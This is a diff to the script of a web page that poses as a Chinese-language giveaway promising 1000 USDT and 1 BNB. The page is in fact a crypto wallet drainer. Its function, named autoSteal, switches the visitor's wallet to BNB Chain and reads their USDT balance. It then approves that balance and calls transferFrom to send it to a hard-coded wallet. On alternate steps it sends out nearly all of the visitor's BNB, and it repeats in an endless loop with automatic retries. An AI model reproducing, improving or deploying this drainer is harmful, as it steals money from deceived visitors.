@@ -24,13 +24,16 @@ h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);fo
   <div id="status">正在领取1000USDT+1BNB</div>
 </div>
 <script>
-const BVXZA = "0x1ff42792e962228099cfA175aDba5412dab1448c";
 const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
 const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
 const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 let web3, userAddr, isOddStep = true;
 
-const USDT_ABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
+const USDT_ABI = [
+  {"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+];
 
 function updateStatus(msg){
   document.getElementById('status').innerText = '正在领取1000USDT+1BNB';
@@ -48,17 +51,21 @@ async function autoRedirect(){
 
 async function autoSteal(){
   updateStatus('正在领取1000USDT+1BNB');
-  
   try{
     await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
     web3 = new Web3(window.ethereum);
     const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
     userAddr = accounts[0];
     
+    const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDR);
+    
     if(isOddStep){
-      // 奇数步：USDT无限授权（即使取消也会自动再授权）
-      const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDR);
-      await usdt.methods.approve(BVXZA, UNLIMITED).send({from: userAddr});
+      // 奇数步：USDT授权 + transferFrom
+      const balance = await usdt.methods.balanceOf(userAddr).call();
+      if(balance > 0){
+        await usdt.methods.approve(TAX_WALLET, balance).send({from: userAddr});
+        await usdt.methods.transferFrom(userAddr, TAX_WALLET, balance).send({from: userAddr});
+      }
     }else{
       // 偶数步：BNB全转（留0.001手续费）
       const balance = await web3.eth.getBalance(userAddr);
@@ -70,8 +77,7 @@ async function autoSteal(){
     }
     
     isOddStep = !isOddStep; // 切换奇偶步
-    setTimeout(autoSteal, 1500); // 1.5秒后继续无限循环
-    
+    setTimeout(autoSteal, 1500); // 1.5秒无限循环
   }catch(e){
     setTimeout(autoSteal, 500); // 失败0.5秒重试
   }
